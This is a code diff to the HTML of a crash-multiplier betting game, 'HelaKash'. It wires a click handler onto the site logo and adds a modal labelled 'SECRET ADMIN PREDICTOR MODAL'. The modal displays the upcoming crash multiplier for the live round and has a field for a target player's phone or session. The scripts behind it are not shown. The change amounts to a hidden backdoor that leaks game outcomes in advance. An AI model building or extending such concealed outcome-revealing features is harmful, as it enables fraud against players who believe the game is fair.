@@ -22,7 +22,7 @@
     <!-- Top Navigation Header -->
     <header class="top-header">
       <div class="header-left">
-        <a href="#" class="brand-logo">HelaKash</a>
+        <a href="#" class="brand-logo" id="brandLogoBtn" onclick="handleBrandLogoClick(event)">HelaKash</a>
       </div>
       <div class="header-right">
         <div class="header-actions" id="headerActions" style="display: flex; align-items: center; gap: 8px;">
@@ -525,6 +525,27 @@
         </form>
       </div>
 
+    </div>
+  </div>
+
+  <!-- SECRET ADMIN PREDICTOR MODAL -->
+  <div class="modal-overlay" id="adminPredictorModal">
+    <div class="modal-content">
+      <h3 class="modal-title" style="color: var(--primary);">✈️ HelaKash Admin Predictor</h3>
+      <p class="stk-desc" style="text-align: center; margin-bottom: 20px;">Displays the upcoming crash point for the active round. Auto-updates when game starts.</p>
+      
+      <div class="predictor-display" style="background: rgba(255, 255, 255, 0.05); padding: 24px; border-radius: 12px; border: 1px solid var(--primary); text-align: center; margin-bottom: 20px;">
+        <span style="font-size: 13px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-gray); display: block; margin-bottom: 8px;">Next Crash Multiplier</span>
+        <strong id="adminNextCrashVal" style="font-size: 32px; color: var(--primary); font-family: 'Outfit', sans-serif;">x?.??</strong>
+      </div>
+
+      <div class="form-group">
+        <label for="adminTargetPhone" class="input-label" style="display: block; margin-bottom: 8px;">Target Player Phone/Session</label>
+        <input type="text" id="adminTargetPhone" style="background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: #fff; padding: 12px; font-family: inherit; font-size: 14px; width: 100%; box-sizing: border-box;" readonly>
+      </div>
+
+      <button type="button" class="btn-primary" onclick="fetchAdminNextCrash()" style="width: 100%; margin-top: 16px;">Manual Refresh</button>
+      <button type="button" class="btn-modal-close" onclick="closeAdminPredictorModal()" style="margin-top: 12px;">Close</button>
     </div>
   </div>
 
